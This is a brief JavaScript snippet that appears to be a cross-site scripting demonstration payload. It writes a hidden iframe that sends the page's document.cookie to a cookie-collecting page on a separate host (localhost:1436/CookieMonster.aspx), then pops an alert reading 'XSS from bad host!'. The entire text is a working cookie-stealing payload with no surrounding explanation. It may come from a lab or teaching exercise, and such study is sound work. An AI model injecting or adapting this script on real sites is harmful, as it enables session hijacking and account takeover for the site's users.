    function AttackFution() {
        var s = '<iframe style="display:none" src="http://localhost:1436/CookieMonster.aspx?c=' + escape(document.cookie) + '"></iframe>';
        document.write(s);
        alert('XSS from bad host! AttackFution');
    };
    AttackFution();
